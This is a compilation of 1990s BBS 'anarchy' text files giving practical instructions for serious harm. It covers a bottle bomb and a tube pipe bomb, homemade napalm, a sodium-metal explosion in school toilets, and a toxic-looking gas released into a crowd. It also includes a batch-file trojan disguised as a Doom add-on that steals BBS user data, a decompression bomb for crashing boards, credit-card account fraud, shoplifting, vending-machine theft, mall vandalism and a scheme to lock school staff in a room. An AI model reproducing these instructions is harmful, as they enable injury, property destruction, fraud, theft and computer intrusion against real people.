   1-800-695-4882. username : new. Or call via Tymnet.

   Getting An Account
     
      Getting an account is relatively easy. In fact, if you enter info
   that it accepts, you can be on right after you register. What I did to
   get an account was find out some info on a person(say a neighbor or 
   distant friend) and put that info in there, just so that everything
   is consistent. This is better for keeping an account longer.
   You have to use a credit card if you want on right away. The
   credit card prefix has to be consistent with the card you choose.
   i.e. Some Visa cards have a prefix of 4226. And the card has to match 
   an algorithym, meaning you can't pull it out of yer ass.
   Sign on with the 20/20 plan so you can call up right away. If everything
   goes well, it'll give you a list of Tymnet/Sprintnet dialups. If not
   it'll say something to the effect that it can not log you on with the
   information you have entered. Also, make sure you have selected the
   20/20 telecom program, or else you won't be able to access it by 
   Tymnet or Sprintnet. There you go.

   Misc. Stuff

      This system is small, so only use one account at a time. This may keep 
   the security the way it is for a while. You only need one anyway. It is   
   growing, so false accounts maybe harder to stop. This system itself is
   very screwy, but it does have Telnet/Ftp/gopher/whatever. And if you're
   trying to get someone's password, they're 8 alpha-numeric characters
   can be as low as three. Well, have fun.

The creator of this text is in no way responisble for any damage, loss of life, injury, or personal injury 
caused by someone trying any of these idea's...

>>>>The Bomb<<<<<<

	Ok, this is really pretty simple.  Here's what you need, a glass bottle with a screw on lid, preferable 
some sort on a small sample bottle or something, gun powder which can be extracted from fireworks, 
bullets, or can be made. Keep in mind that if your over 18 you can go to any hardware/fire arm  store and 
purchase gunpowder and or ammunition.. 
	Clean and dry the bottle well.  Fill the bottle about half way with the gun powder, place the fuse in 
the the center of the bottle and fill it up to a little befire where the neck of the bottle curves in, then place a 
small amount of cotton on top of the gun powed and if you like pack it down a little bit. Always making sure 
that the fuse is in the center and placed fairly deep into the gun powder.  Then light a candle to get some 
wax and pour the wax on top of the cotton to make a good seal in the bottle, allow the wax to dry and then 
punch a hole in the cap for the fuse and screw it on really tight.  
	At this point you can either leave it as is and find somewhere to set it off or get some packing tape 
with the water activated adhesive on the back, and preferably reinforced and wrap the bottle in it, this will 
magnify the noise and damaging effects of the bomb.  

See the diagram attached for futher information.   Also if you want to make a really strong bomb, you can 
buy whats known as silver powder at the hardware/gun store.  Its like 1000x more powerful..

                              Cheap Virii



       First off, if you know how to code already, or already an
       experianced virus writer, dont read this. This txt file explains
       how to make a simply, cheap "virus", to accomplish a task on a
       computer other than you own. To do this, you dont need to know
       anyhthing, execpt basic dos commands.

       First off, you must select your target. It could be a BBS user.dat
       file, a fucker who you want to mess with, or just to annoy a large
       gruop of people. Haul out your old handy text edit, like Qedit,
       or the edit Dos prog. Now is the hard part, you must use your
       brain to muster up an idea. Lets say to want to get a local PD
       users.dat file from a renegade dir. First, you must understand
       that the person must run this file for it to work. Next, the
       first command should be ECHO OFF, and then the next few lines
       should use the ECHO command to display messages to the user.
       They should say shit like - Renegade Bug Fixer - Doom 2 level
       add ons - etc....to make it more realistic, use the ansi
       color codes in these text lines. To get a list of em, check out
       the file CODES.TXT. It has the complete 15 color cycle, withw
       the FULL ansi codes next to them. Simply, veiw the file[ with a
       text editor], and write down what colorz you want to use.

       You should have your intro now, next your "virus" must do
       somthing. In our example, we will have it disply the text
       " Warping Doom 2 ", this is so the people understand why
       their computer is running and coping files. After that is
       displayed, make a sequence of commands like this:

                   [0,30m ---- Warping Doom ----
                   CD\RENEGADE\DATA
                   COPY USERS.DAT PERSONAL.ANS
                   CLS
                   COPY PERSONAL.ANS C:\RENEGADE\MISC
                   CD\

       So what these commands do, are make a fony intro, make the
       users.dat into a menu file, and then copy the " personal.ans "
       file to the ansi dir. So the maker of this text file could
       veiw the users.dat file by just hitting ? at the personal
       menu. These "Cheap Virii", are cheap, in that they require
       the person to run a file. Also, make sure after every
       COPY command that use have CLS on the next line, otherwise
       the loozer will see 1 FILE(s) COPIED, and get supsious.

       Now you should have your .bat file. But no one in there
       right mind would run a .bat file without looking at it
       first right!? Thats where the BAT2EXEC prog comes in handy.
       It is inclosed in this packet. What BAT2EXEC does is make
       your .bat file into a .com file. So, run it, make your
       .bat file a .com file. Then copy your .com file into
       a .exe file[makes it look more legit[[there is no difference
       when you run them]]]. Now you have a handly little "virus"
       . You can use BAT2EXEC for MANY purposes, it is the BEST
       util i have ever seen[my greetz go out to the author].

        Once you have your .exe file done. You must make it so
        the person will want to run it. If you think a minuite,
        most people like games, so something like a doom file,
        or a One Must Fall file would work here. Once you have
        what your prog is supposed to do, make up a phony .nfo
        file. In it, write bullshit about the prog, what it does
        and why it wont harm your computer. And at the end, put
        a fake name and address[for an address, use abigwar's file
        on gov. address, and just change the top line]. You last
        step is to make a file_id.diz file, and put what the thing
        is, with some shitty ascii drawin. Zip it up, and use
        a account other than your own to UL it to some board.

    Some closing notes. You can do more with one of these shit files
    that get a users.dat, use your imagination. There is one thing
    i suggest tho, just dont put FORMAT C: in a bat file, its not
    worth it, and you get nothing in return(unless the person is
    a TOTALL fuckup, then do it). Also inclosed in this file are
    some example bat files for you to look at.

        "Start Up Package and Instructions for New Sites"
                         by Mr. Sandman

     Well, if you have this then you are most likely a distro site
or interested in being a distro site.  This is an archive of all
the current files you will need to be a G site.  These are the
instructions you must follow:

     1. Make a separate file directory on your BBS for the G
        files.

     2. Place all of the .ZIP files in this archive (except 
        DN-PK00?.zip) in the directory.  DO NOT put the 
        BGR-ALL.ZIP file in the directory unless you are going
        to ass all of our new files to it.

     3. Unzip the file DN-PK00?.ZIP and read the info.  It is the 
        latest DeadNet packet. All new G sites should set up 
        Frontdoor (read the BGRNET_A.ZIP file for info) and pick up
        DeadNet. If you carry DeadNet you will be able to recieve
        our new files through the network by requesting them from
        the node you poll from. If you don't carry DeadNet then you
        MUST call TEKAT at least once a month to look for new     
        files.

     That is it. Thank you for your time.

     Ok, this is it.  The number one best way to make a cool,
excellent, super-flammable substance.  DEFINITELY GIVE THIS ONE A
TRY.
     What you do.  Take about half a cup of gasoline and put it in
a plastic drinking cup or something that you can ditch when your
done.  Then take about 5-6 styrofoam cups or a whole lot of
styrofoam packaging peanuts.
     Now take the gas and put it in the plastic cup.  Then break up
the styrofoam cups and put them in, piece by piece.  What the gas
does is "eat" the styrofoam.  Take a twig or something and mix it
all in.  After a while you will begin to see goo forming at the
bottom of the cup.  Make sure it is stirred in well, all nice and
gooey.
     Now when the goo is there, dump the gas, possibly saving it
for another batch.  When the gas is out you will still have the
gooey substance.  This is what you want.  This stuff is GREAT.  If
you want, you can use it right now.  Just scoop it out and put it
on whatever you want.  Then light.  Whoosh!  It burns nice and
slow, keeping a constant good flame.  If put on a vertical surface,
it slowly runs down leaving a nice burn mark.
     But here is the best part.  You can mold this goo into
whatever you want.  What I described was enough to make a golf-ball
size wad.  It is great at anytime.  Just mold, stick, light and
walk away.  It also doesn't go out that easy.  I tried to stamp it
out but it stuck to my shoe, still burning.
     Water will put it out but does not stop it from being used
again.  I put a wad on a stick, lit it, dunked it in water to put
it out, and then easily lit it again a few seconds later.  The
water just puts a minor damper on it.
     Just think of all the possibilities.  Make a really large wade
of it, and put it in the street to burn at night.  When someone
(night walker) sees it and tries to put it out, their shoe will
flame until they can smother it.
     The only down side to this whole thing is that it is hard to
work with without touching.  Other than that, it is the best thing
that I have ever developed to burn.  It is truly great.
     Give it a try, it is a definite MUST!  See if you like it and
contact me on BAR's WHQ or a dis. site if I am there.  See what
else you can do with it and tell me.  Make torches with it dried on
a stick, do anything.  Just don't be dumb and get in trouble or
hurt.

                            To Gain Control
                              By: Abigwar



   So, Your school pissing you off? They not doing something all other schools
are doing? Or you and your friends have demands that they won't listen to? 
This is your quick guide to gaining control over your school. It wont be easy,
but standing together nothing is imposible.

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
*  The first method is the terroristic... It is probally the most effective
*  And quickest method. However it takes a good deal of planing. 
*       
*     Step- Find a motive.
*       
*     Step- Build an infrastructure.. You need people.. Get them. The best
*           people to have on your side are the janitors, They will know
*           the school inside and out. Make sure there is something in it
*           for them.
*        
*     Step- Gain control over all communications leading out of the school.
*       
*     Step- You have to get all the teachers in a room together with
*           the amminstration and secreatarys. Easist way: Have some
*           one call a manditory student government meeting. 
*     
*     Step- Fill and surrond that room with the SS (Student Security)
*
*     Step- Lock the doors, no one can get in or out.

+  The next method takes time, And planning.. It is the way that is most legal
+  and easiest. It is the infastructure Infultration.
+
+     Step- Get many people who represent your point of view to run for 
+           student councel (government) Have about two of your members
+           run for each position... This doubles your chance of getting
+           elected.
+
+     Step- Make sure all the members of your clique vote for one of the 
+           planted people.
+
+     Step- After your members are elected, Have them come out in public and
+           admit to being part of your clique. If you have a member in every
+           avalible section, You now control the student government. Which
+           controls the school.

@  When i was in 8th grade my group (HellRaisers) did it in our school. 
@  (Warren Hills Middle School) It took a long time, But in the end it was all
@  worth it. No one could control us... Even the school. This method we copied

          "HOW 2 WATCH A PAY MOVIE IN A HOTEL 4 FREE!"
                         (what a deal!)


     Did 'jever have an urge to watch a pay movie in a hotel when
there is nothing else 2 do?  Of course you did.  So you go and say
to your mom, "Mom, can I get one of these here pay movies tonight?" 
And she says, no!  It will be cheaper to rent it when we get back
home.  Jeeze, u say to yourself, all I wanted to watch was `two
cocks on pussy'.  Oh, well.

     Well here is how u watch a good deal of it, 4 free.  It really
helps to have two people, but that doesn't really matter.
First, switch the tv to channel 3 (or whatever it needs to b on). 
Then press one of the (usually 4 or 5) buttons on the pay box. 
This lets u get a sneak peek of a movie for about 5 secs.  Then,
click.  Back to regular 11 o'clock news.  

     This is how to get past that.  After it clicks you off,
quickly unplug and then plug in the tv, and do the process over
again to view the free seconds worth.  After doing this a number of
times, u might notice a change happening.  U see more and more for
free.  Last time I tried this, my friends and I got about 45
minutes worth of some cheesy porno flick.  Pretty cool, considering
u can see a lot in 45 mins.  Good luck.  It should (will) work!

1. Sport a funky name. Osgood, Trent, or Chad is cool so they think about
your name and rember it. Bill, Biff, Greg, and Dave are out.

2. Cruise shopping malls. Chicks love to shop, so learn to live with it. Get
a drink with a straw and slowly mender your way through making eye contact.

3. Be sensitive. Chicks dig sensitive guys, If your not afriad to show emotion
even better. If they see you give candy to a little kid, or cry, they are your
slave.

4. Get a puppy. Nothing melts a chicks heart like a playfull puppy. They just
have to stop and pet it. You say, I got it at a shelter, they where going to
kill it.

5. Own a car. Every one needs to get some where, so even if your butt-ugly
and your driving you score.

6. Show cash. See above, Money talks, Bull shit walks.

7. Compliment them. 

8. Be a vegitarian. Chicks cant stand thinking of people eating poor slaughtered
caffs.

9. Get a cool job. Work at the movies and get people in for free.  Or work as
a bartender, or DJ, and bro you are in there.

10. Have your own place. Throw a kegger at your house every friday night, There
is no telling what gets left behind.



                       How to become a K-Rad 3L1T3 d00d

                   Are you a lamer? Have you ever wanted to be
                   like one of those warez d00ds, with the cool
                   sigs, knowledge, and affilations? Well,
                   now you can! With these simple steps, in no
                   time you will be a /<-r4d 3L1T3 D00d!


   Step 1. Pick a 3l1t3 handle.
                It seems to me, that most of those d00dz get there
                handles from crummy movies. Another thing you can
                do is simply make up a name, with alot of i's, 0s,
                and x's. Comic book charactes are also very popular,
                like wolverine, or video game characters. Once you
                have your handle choosen, make sure it is new, and
                isnt being used. After that, proceed to step 2.

   Step 2. Make a 3l1t3 signature.
                2nd, you must make one of those 3+ line sigs.
                Everyone has one. Now, you will look real
                stupid if your sig isnt leet. The best way
                to make a leet sig, is to use TheDraw, and
                draw one a ansee one. Make sure you use
                lots of colors, and spell your name in
                upper ascii characters. After you save your
                ansi, use a program to make it into a
                | code sequence. ANS2MSG is my favorite prog.
                After that, do an ascii upload after all
                your messages. Now you are on your way to
                becoming a leet d00d!

   Step 3. Learn the ACRONYMS for those groups.
                As you might have noticed, to get anywhere,
                you must know all those spiffy ACRONYMS, to
                learn these, simple study the following list,
                Write down exactly what the following say, this
                list should be complete enough.

      PWA: Pretty wittle animals.            BGR: RGB(Red-green-blue) Monitor
      INC: Incorperated                      DNA: Those Jurassic Park dino's.
      PBX: Penut Butter X Jelly              THG: The Happy Gorillas.
      VMB: Video Arcade Games                FLT: Microsoft Flight Sim.
      RZR: Bic's new shaving line.           USA: United Super Atlhetes
      PIL: The new drug, called pil.
      iCE: internation consumer electonics

   Step 4: Getting Known
            Your next step is to become known and popular. You
            have your name, sig and knowledge. Next, set up a
            ELiTE PiRATE BBS. To do this, you must simply
            complete the next 3 steps. Set up a hacked
            version of OBV/2 or Renegade. Go to your
            computer store, and buy a game. Then copy it
            to your HD, zip it up, and return the game and
            get a new one!!!(this is the true definition of
            software piracy). The last step is to let everyone
            that wants on have access. Now, you have some EL1T3
            warez, a board, and a following(the users of the board
            think your leet cause you can pull warez). The last
            step in setting up a 3l1t3 board, is naming it. Name
            it off a movie, like The Krow, Subterrian, etc. Those
            are popular names.

   Step 5: You are now a leet d00d.
            You have a name, sig, knowledge, and a board now. You
            get the good warez from compusa, and you only have to
            pay for one of em! You now have a local following cause
            people think your leet, and the kids at school/work
            worship you now. You have now completed your 5
            steps to becoming elite. Your next step is to
            make up art/warez groups to put in your sig(read
            previous BGR files on that).

                            Presents: 
                "Making Life in the Mall Hell..."


  I hate the mall.  I hate it right to the core of my being, I hate the 
annoying yuppee and preppie families wandering around in it, I hate the smell
that it emits, I hate almost everything about the mall...I am miserable when 
I am in it so I have devised methods to make everyone else in there miserable
too...Have of this guide goes out to my friend esse, who together we have made
the mall near my house a living hell...
   Ok, malls are mostly boring and superficial places, that when realized of 
their potential can be quite a bit of fun...Of course you will need some 
materials before hand:Stink Bombs, I myself use ammonium sulfide brand, they  
are quite a bit cheaper and easier to find.  You can buy these in most magic
shops or joke shops, and I have even found some in Spencers.  These little 
babies can cause so much fun it's incredible, but you will need to realize 
some things first:the smell ordinarily lasts only about a minute, but like
everything that can change.  Ok, my favorite place to unleash these foul 
little beuties is in the most expensive clothing store I can find...Go, try on
a pair of some jeans and why you are in the changing room bust one by stepping
on it or throwing it as hard as you can against a wall...next clear out of 
there, and head across the isle...from their watch the people come flying out
of the dressing rooms, holding their noses and saying stuff like "Good god!"
These little tricks are fun to use in an arcade, nothing is quite as amusing 
as watching the manager as all his customers leave...Other favorite target 
places are in the elevator...now the trick to effective use of these is this:
It can only be within a fairly enclosed area so the smell doesn't drift off.
I use garbage which are highly effective, and in the two places I mentioned                     
above the smell tends to linger.  
  Now onto a new insturment of hell:gum.  Gum can be used in the most interesting
of ways while you are in a mall..Like, smack some on the escalator...if it's 
a big gob it will usually get caught near the bottom and stretched over three
or four steps before coming back around.  It's also fun to smack some on pay
phones and coin slots, or just about anything else you can find...or here is 
one of my absolute favorites...go back into that little hall near the mall 
bathrooms, now if you are in a decent sized mall there should be a number of 
doors that aren't bathrooms leading off from that hall...some are to stores 
but some may be to important places...the one I always gob is the door that 
says "Security Office"...it's a riot to see mall security have to call a lock
smith.  Tampa Bay Center, one of the malls near where I live is quite a rich
mall, having a carasouel in it...I like to squish a gob on the something like
a pink pony, or something you know someone will probably sit on..It helps tho
if the gum's color corresponds with the rides color...i.e.banana on yellow 
strawberry on red, etcetera.  Gum and the like is sooo fun when placed in the
hands of hoodlum...
   Next up, this trick you will need a mall with two stories...Most malls have
these cheap little booths setup for people who are too lazy to rent out a store.
These carts are victims in the waiting.  Some of them sell foodstuffs, like 
ice cream or yogurt, or some sell fudge...These are what you need to find, 
and if you find one within good range you will need something that is absolutely
inedible...I usually use chili-powder for ammo when nothing else is available.
Crumble it up and wait...sometimes send a friend down below to question the 
store owner and distract him and then drop it right in...now unless it's a 
tofu stand someone usually comes along every couple minues so just wait for 
someone to buy some...And try not to laugh when they get a taste of it...
The possibilites from a second floor are endless...Wait to find some guy and
his girlfriend having lunch below...Remember that gross substance?  I'm sure 
you can figure out the rest... 
  If you have balls, and have an awesome hate of preppies(I do) then this is 
always fun to do a few weeks before school starts...Most preppies I have found
go to different stores for different stuph, like (ugh)the Gap for jeans and 
(equally -ugh-)Merry Go 'Round for shirts, the point is by the time they have
made it from one end of the mall to the other they usually have tons of bags,
and stuff way to heavy to carry...So when they get to the store they drop the
bags off near the counter while they look around inside...now to get this trick
to work you need to walk in right beside them, and when they put the bags down
dump in a generous portion of something...I use ink or that slime that you 
can buy from a gumball machine for a quarter...Be sure that no one sees you 
or you could get in a shitload of trouble for it.  This same tactic can also 
be used at Footlocker, first walk around inconspicuously, and lift up a few 
pair of shoes, look them over and out them back...now when you come to the 
newest and hottest shoe that everyone is buying, when you lift it up and look
at it, deposit a gooey substance in it, but move it towards the front near the
toe...I have used gum and everything else for this...Well, that about raps it
up for now...I hope you enjoy reading this as much as I enjoyed using the 
methods...And if I make it in to G look forward to more hell to come...

                    STEALING FORM COMPUTER SHOWS!
                          $$$$$$$$$$$$$

	Okay, at any computer show with low security, most of them have like
NONE, except for the front door, it is VERY easy to steal something.  Because
most of the vendors are really stupid and trusting(sometimes).  Okay, most
of us don't have a CDROM, well, go buy one!! and you can have a ball getting
all these adult, educational, game, CD's for FREE!  Yes, I got like 30+ CD's 
in one computer show!  And basically no suspicisions were raised.  Well, this
is what you do to get CD's.  You take the cd's put it at your side. and leave.
it is that simple!  If you are the scared kind, well, get a flyer or some piece
of paper and then take the CD.  make believe that you are very interested in it
and look like you are read the descriptions.  Well, keep your eyes open for the
vendors.  Once they turn away, or are dealing with another customer, very
slowly, put the cd at your side and just walk away, notice I said WALK, not run.
They won't suspect anything.  A very good way to do this is to take it, and 
walk behind a big fat person.  BAM!  You got your cD!  Get a hoard of them.
If you get doubles of a cd like I did.  SELL THEM!!!

	HD's are simple ONLY if they are used ones.  If they are new, well,
they will be VERY hard to steal.  Well, to steal the used ones, just do the
same exact thing as the above.  Put it at your side, and walk away!!!  of
course, watch out for the vendors.  New ones, I wouldn't try to take them,
since the vendor is usually very carefully watching them. and usually have
tape, taping them down, so when you want to take it, you have to rip the
tape, creating lots of noise, and bam!  you can be easily busted, and you don't
EVER want that.

	Diskettes are hard to take, since usually they are very bulky!  Find
a vendor that has big tables, and as little salesmen as possible, and of course
sells disks.  When you start getting all these warez!  you need some place to 
store them right!!  Unless you have a tape backup.  Tapes are much easier to
take though.  For diskettes, and tapes, follow the directions of the CD's, and
you got yourself new diskettes.  Try to get formatted ones, since unformatted
ones are such a BITCH for format!

	Accessories, are nice to take.  you know enhance you system.  the more
expensive the stuff, the more carefully they are watched.  For me, I bought a
CDROM, and needed a internal SCSI cable, well, it costs $4, well, you just
follow the exact same directions as the CD's and you got your self a cable.
If you are looking for things like speakers or mice.  They usually come in a
box and put in front of the vendor, so sorry, you can try, it might work, but
chances are low.

	Drives, 1.44 or 1.2, are not easy and it takes time.  yOu have to
carefully observe the vendor for a while, watch his habits.  Many times, they
will have tape over the drives.  Well, slowly take it out, and put it at your
side and walk away.  Make sure no one is watching, the vendors nor the
 customers!

	Games are easy.  The vendors usually have a bunch of people crowding
their table.  Do the samething.  Put it at your side, or even better, in a bag
so it looks like you bought it! (yeah right)  If the box is in a weird shape,
take your time, and wait for the right moment. Ex. Maniac Mansion CD, Ultrabots,
or even Comanche,etc.

	If you looking for BIG stuff, like a tape backup, cdrom, printers,etc.
Well, it really helps if you got in as a vendor, and have a little marker thing
(tag, wristband,etc.) that shows that you are a vendor.  Just go between a
group of tables(you know the way the tables are setup, that there are some in
a circle, and the vendors put their merchandise in the middle!)  well, you just
take it from the vendors,  because usually they don't look back!!!  and hand
it to a friend(it helps if you have a friend that went with you also) and 
BAM!  new equipment!

	Motherboards, CPU's, and RAM, are nearly impossible to steal.  They are
bulky, and tacky to hold and hide!  DON;T EVEN THINK ABOUT STEALING THOSE
BUNDLE SHIT!  like the fusion 16 cd.  I really think they'll get suspicious and
notice teh disappearance immeiately!

	Also, bring a Bookbag or some kind to hold the goods!!!  have phun!

Until next time..........

  Have you ever wanted to practice hacking, safely, with NO risk of
getting caught? Well, I did... So i looked around and found this program
called ULTRA99. It's a hacking simulator. Quite well done i might add.
Well, Here it is. All wrapped up in is fresh new Self-Extracting .Exe File,
Just for you.

 Just type 'SAFE_HCK', And wait.  Once its all done extracting, the program
to run is 'Ultra99.exe'.  When it askes for the LOGIN code, it is 416515. 
It has every thing you need write there. Except of course the Pen and paper
your gonna want.

                 "How to get bills out of a soda machine"

        This is the easiest way to get money out of a soda machine.  This
method will only let you get out the dollar bills though.  You are only 
going to need one thing to get all of the cash.  You have to have a cro-bar
on you.  Although bring a phillips head screw driver.  This only works on 
New Coke machines though.  The Coke Machines must have a dollar bill slot 
on them also.

        Here is what you are going to have to do.1) you want to take out 
your crobar and make sure that nobody is around.  Then you want to look
at the machine.  You will see that there is this lit up thing that says 
coke is it or something like that.  It should be right over top of the 
dollar bill taker.  2) Now that you have found your target, you want to
hit that plastic cover with your cro-bar.  The thing that you are hitting 
is the little lit up square.You wantt to bang that in and take that out.
3)Now that you have taken out the plastic cover with the saying on it.
You are going to see this black thing right in front of you.  In is locked 
on pretty well.  The dollar bills are piled in the back of it.  If you look 
you can see them.  Take the cro-bar and wedge it on a side.  Preferably 
the right hand side. Now you want to flip the box around.  Push on the 
cro-bar as hard as you can.  It should budge and then you will be able
to get to the money source.  
        If the black box doesn't move, then this is where the phillips 
head comes into place.  You are going to see many little screw.  Take as 
many out as you can.  Then try to pry it again.  It should definatly work 
now.  NOw you have tons of cash.
        The best times to do this on the machine is when many of the little 
orange lites are lit up.  That means that the sodas are gone.  That would 
then clue you off that there is going to be more money in there.

 There are million of chemicals that you can mix to get bad smelling gases.
But this one looks as bad as it smells. My friend told me about how a movie
theater dick him and his friends over once... So before a show started we
got together while every one was in line out side. From a 23 floor of a
building across the street he mixed Hydrocloric acid with chunks of alumnium.
He caped the large bottle and threw it near the croud. Then, our bud on the
street yelled "POISION GAS!!", and every one paniced.

 The combonation of the two formed a very dark gas that smells very very bad.
The police and fire department closed all the streets in the area for a while.

All you have to do is put Hydrocloric acid wich can be bought at a pool suply
store in a large bottle and add the aluminum chunks. 

  Some other chemicals are:
   1. Rotten eggs
   2. Skunk Repelent
   3. Dog Repelent
   4. Cat Repelent
   5. Shark Repelent (issued to air force piolits_
   6. Fart Spray (Practical joke that REEKS!)

                 Safty precautions for storing explosives
                                By: Abigwar


1. The most important factor for picking a storage place is its location.
You will want a place close enough to be under your survalince, But not
close enough to be hazardes to yourr family. All explosives magazines or dumps
must have secure locks on them.

2. Do not store blasting aps, electrical caps, or primers in the same 
containers as any other form of high or low order explosive.

3. Do not store fuses or fuse lighters in a wet or damp place, Or near the
storage of flammables such as gas, oil, paint, cleaning fluids, ect.  Fuses
should be kept away from radiators, steam pipes, stoaves, or any other sorce
of heat. 

4. Metals should be kept absolutely away from explosives. NO TOOLS IN YOUR 
DUMP!

5. Never allow an open flame near your dump. Meaning lighters, ciggerettes,

6. Do not allow leaves or brush to build up around your dump.

7. Never shoot into, or near your dump.

8. Make sure you know all aspects of compunds nature before handaling and
storing it.

9. At all times use common sense, and allow only qualified personal near
the explosives.

                           Trillion

          I came a across this idea while looking around 
  a Rockaway Sales hardware store for a suitable pipe for a pipe 
  bomb. I came across this plastic tubing. It was bendable, yet
  was not too thin. I decided to see what I could do with it.
          I decided that this would be suitable for a bomb that
  could get into "hard to reach places" and bend around corners
  for tight fighting spaces. I got about 6 inches of it. I yanked
  a fuse out of a pipe bomb because I didn't feel like making them, 
  but virtually any fuse would be fine. I melted some wax from
  the bottom of a candle onto the "mouth" of the tube. This formed 
  a half circle.
                     TTTTTT        T - Tube    TTTTTT
                    T      T       w - Wax    TwwwwwwT
                   TwwwwwwwwT      F - Fuse  TwwwFFwwwT
                    TwwwwwwT                  TwwwwwwT
                     TTTTTT                    TTTTTT

          Then I placed the fuse on top of the half circle and 
  melted a little more wax onto it to seal it. I left about 1 1/2 
  inches of fuse in the tube. Then I sealed of the rest of the opening.
  Then I poured some blackpowder into the other end. Until it was about
  halfway full. Then I stuffed tissue paper into it until it was pretty 
  tight. Then I could have either used more wax or sealed a cap onto it.
  You could have also sealed a cap onto the fuse section, but I was too
  lazy. Now this cannot bend at 90 degree andgles but it is still
  good for a fair curve. Just remember to pack it tightly and to have 
  sturdy endcaps. Have fun!

                     "A New Way To Crash a BBS"
                            by: Crackerman
    
    
    If you live in an area code like mine, you would want to know how to crash
some annoying lamer PD boards. You have seen multiple articles on how to
crash these nasties... of these 1 out of 20 work. There is the proven
Renegade MCI code hack method.. but all sysops are on to that now. Well
there is a new method I have discoverd. Although it is not a "Drop to DOS"
hack method.. it is equally annoying for a sysop who is constantly away and
can't tend to his board full time.

   With ALL board types there is a common thread in most cases: An Upload
Checker. With my method of crashing you utilize the upload checker to its
full extent. I do not condone using this on C00L boards.. since most have
an upload checker also.


  Well you've read.. and now how to do it. First you must obtain:

     UUCODE                  (On most boards)
     Resizer                 (Uncoded Below)
     Pkzip                   (Ahhh Duh! If you don't have it.. go home)

At the end of this article is a UUcoded file called Resize. It will resize
a file you tell it to.. to any given ammount. Unencode the file and lets
fucken go!

     1) Make a TXT format file using EDIT.COM or Qedit... whatever.
     2) Use resize with the following format:
        --- Resize ??????.TXT 70000000+ <enter>
     3) Take the resized file and Pkzip it.
     4) Upload it to your favorite board with an Upload checker.

Here is an explanation of what you just did. First you are creating a fake
text file to resize. When you resize the file you are adding more to the
program making it larger. But there is a catch behind this. A command
augment part of Resize is (-r). This pads the file with random bytes of
information. In our example we left that out.. thus Resize pads the file
with ALT-255.. or spaces. When you zip this file it will zip down to its or
nearly its original size! Thus a 70meg text file (as done above) would
reduce down to the size of the original text file you created in step 1.
Depending on your HDD space you can create huge files with it.. make a
200meg one if you chose... but Pkzip can take a LONG time (Depending on
machine speed) to compress the file.

  You should now have realized the beauty behind this trick. Your local
lamers board receives the file. It does it's usual uncompress test and
BOOM! the thing is 70-200+ megs plus! Depending on HDD size it will cause
untold havoc. If the HDD is filled the BBS will not be able to create the
Error Correcting File.. thus sending the BBS into and endless loop. If the
HDD is some 1.5 gig monster it will still cause Parity Errors,Major
Fragmentaion and random disk writes. Either way the BBS is down for a while
or something is destroyed by the random disk writes.

WhAt OuR GrOuP iS rEaLly AbOuT:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This is the first of what i hope will be many F0D G-iles ranging over many
topics such as hacking, phreaking, anarchy, etc. F0D actually SUPPORTS lamers (amazing but true). They are the life-blood of the fast fading "elYtE" scene. Winhout them there would be no realexperienced hackers/phreakers/anarchists in this world. Everyone started out as a lamer, including YOU!!!!!!

Our goal is to incourage the free exchange of information in todays society
and also to provide some of the most informative text phieles around. F0D
will publish our NEWZ Letter whenever we have a chance, so in turn, don't
expect a new letter every month. Each text phile is the synthesis of many
hours our reading and research. As you read the philes you may notice
many garmatical and spelling errors. Sooooo...for all you people who pay
attention to that shit, i respond by saying:

				 FUCK YOU

Now on to the g00d shit--------------

ThE WaTeRmAiN UnDeR YeR ScHoOl:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This is the most little known weak point of yer school. The wonderful fuck-up jobs which i am about to describe are executed in the bathrooms. First, let's discuss the job that requires a little amount of danger, and not to mention the the right materials.

At this point i would like to thank The Bad Ass Retards for their very
informative text phieles.

	Here's how you do it. You get some Sodium or Potassium metal
you can usually find it either in your chem class or in a science supply
book, preferably in the form of like a 1 inch wide bar. Usually science
classrooms will only have pelets, but those will work you'll just need
more.  You'll find the pellets packed in glass bottles filled with oil,
yes, oil, this stuff is so volitile that it reacts with the moisture in
the air.  So, you get some plastic wrap or a plastic bag, pull some of
the pellets or a bar or two out of the jar and put it into the bag, and
loosely close it or wrap it, but tight enough to keep the water out
until it gets a little bit down the pipe.

	Then without getting the bag wet or anything proceed to
the nearest restroom, carefully place it in a toilet and flush it.
As the bag or plastic wrap package is travelling down the
pipe it will slowly open up, and when it does, the water hits the metal
which has a very violent reaction and make heat upto about 2000 degrees
farenheit and alot of hydrogen gas, so when the gas builds up the heat
ignites it and boom you have a high powered Hyrogen gas explosion.  And
as it keeps travelling it keeps flaming and/or exploding which usually
causes the pipe to crack so if you use enough you might get out of
school for a day or so..  Thats all there is to it.

Notes: Make sure that the bag or plastic wrap is sealed tight enough
otherwise it will blow-up in your face when it hits the water.

2.  Also after you flush it run like hell because the water/sewage will
probably fly out of all the drains in the bathroom..

3. If you want to doo a test reaction take a thick walled measuring
cup, put a little water in, and drop no more than say 5 pellets worth
in..

And there you have it-------- CIAO BABY, SAY BYE BYE TO YER BALLZ!!!!!

Now i will speak about the second method to total FUCK UP yer favorite
school's pipes. (this one is a lot simpler).

Ok..this has to be pulled off during either:
A: the night or
B: when there is a HUGE school wide activity going on (like a dance)

This is because there will be an AMAZING amount of noise.

First gather about 15 g00d friends (hahhaahhahahahaha) consisting of both 
b0yz and girlZ. This is because u will want to hit both bathrooms. 
Then syncronize yer watches ....... i know this sounds corny but you will 
need to do it for this to work. Now have all the boyz and girlz go into 
their respective toilets (he he he). And then at the exact time which u 
have decided on, FLUSH THEM ALL!!!!!!!!!!!!!!!! This includes the 
urinals and the stalls. For added effect turn all the faucets on too.

The reason it works: probably when yer school was designed the original 
plumbers did not take into account the IMENSE pressure caused by ALL the 
toilets being flushed at once!!!! And as i said b4 CIAO BABY!!!!


ThE FuSe B0x:
~~~~~~~~~~~~~
Now we will move on to my favorite force of nature: electricity. I love 
it because it is not only powerful, but it is also DEADLY!!

This fuck up job must also be pulled under the two situations mentioned 
above. Also, like any great prank, this is not a spur of a moment project. 
This requires anywhere from 3 days to 3 weeks of planning the right moment, 
but the payoff is fabulous. 

Blowing fuses can be very easy and do a lot of damage.  
You can make it so your school can have no power in there rooms.  Here
is what you do.  You get a wire from anything that you want, such as
a piece of shit lamp.  You get a knife or wirer cutters and cut the cord 
of of the lamp or whatever.  Now you have they main part of this fuse
Blower.  OK now once you have cut of the cord,  you get the little 
wires inside of the cord and tie them together.  There are two strands
of wires on the cord.  That is in the rubber.  OK you will see these 
